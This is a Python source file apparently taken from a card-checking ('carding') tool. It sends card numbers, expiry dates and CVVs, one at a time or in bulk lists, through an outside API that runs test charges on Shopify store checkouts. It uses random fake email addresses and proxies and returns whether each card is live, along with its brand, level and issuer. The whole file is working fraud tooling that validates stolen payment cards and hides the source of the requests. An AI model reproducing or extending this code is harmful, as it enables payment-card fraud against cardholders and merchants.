"""
Shopify Engine - Uses BabaChecker API
All Shopify checks are routed through the external API.
"""

import aiohttp
import random
import json
from typing import Dict
from config import get_proxy, load_sites

# API Base URL
API_BASE = "https://cyborx.net/api"

def generate_email():
    """Generate random email for checkout."""
    names = ["james", "morgan", "alex", "roman", "artirito", "fred", "yuan", "dhruv", "tokyo", "dustin"]
    name = random.choice(names)
    num = random.randint(10000, 99999)
    return f"{name}{num}@gmail.com"

def get_random_site():
    """Get a random site from loaded sites or use default."""
    sites = load_sites()
    if sites:
        return random.choice(sites)
    # Default sites if none configured
    default_sites = [
        "https://example-shopify-store.com"
    ]
    return random.choice(default_sites)

async def check_shopify_api(cc: str, month: str, year: str, cvv: str, proxy: str = None, site: str = None) -> Dict:
    """
    Check card via BabaChecker Shopify API.
    Format: https://cyborx.net/api/autog.php?cc={cc}|{month}|{year}|{cvv}&email={email}&site={site}&proxy={proxy}
    """
    email = generate_email()
    
    if not site:
        site = get_random_site()
    
    if not proxy:
        proxy = get_proxy() or ""
    
    # Build API URL
    cc_full = f"{cc}|{month}|{year}|{cvv}"
    url = f"{API_BASE}/autog.php?cc={cc_full}&email={email}&site={site}&proxy={proxy}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status != 200:
                    return {
                        "status": "error",
                        "response": f"API Error: HTTP {resp.status}",
                        "gate": "Shopify API"
                    }
                
                data = await resp.json()
                
                # Parse API response
                status = data.get("status", "dead")
                response_msg = data.get("Response", "No Response")
                gateway = data.get("Gateway", "Shopify")
                price = data.get("Price", "")
                
                return {
                    "status": status,
                    "response": response_msg,
                    "gate": f"Shopify {gateway}" if gateway else "Shopify API",
                    "price": price,
                    "brand": data.get("brand", ""),
                    "card_type": data.get("card_type", ""),
                    "level": data.get("level", ""),
                    "issuer": data.get("issuer", ""),
                    "country": data.get("country_info", "")
                }
                
    except aiohttp.ClientError as e:
        return {
            "status": "error",
            "response": f"Connection Error: {str(e)}",
            "gate": "Shopify API"
        }
    except json.JSONDecodeError:
        return {
            "status": "error",
            "response": "Invalid API Response",
            "gate": "Shopify API"
        }
    except Exception as e:
        return {
            "status": "error",
            "response": f"Error: {str(e)}",
            "gate": "Shopify API"
        }


# Alias for backward compatibility
check_shopify_native = check_shopify_api


async def mass_check_shopify(cards: list, status_callback=None) -> Dict:
    """
    Mass check cards via Shopify API.
    Returns dict of {card: result}
    """
    results = {}
    total = len(cards)
    
    for i, card_str in enumerate(cards):
        parts = card_str.replace("|", "|").split("|")
        if len(parts) >= 4:
            cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
            result = await check_shopify_api(cc, month, year, cvv)
        else:
            result = {"status": "error", "response": "Invalid card format", "gate": "Shopify"}
        
        results[card_str] = result
        
        if status_callback:
            await status_callback(i + 1, total)
    
    return results
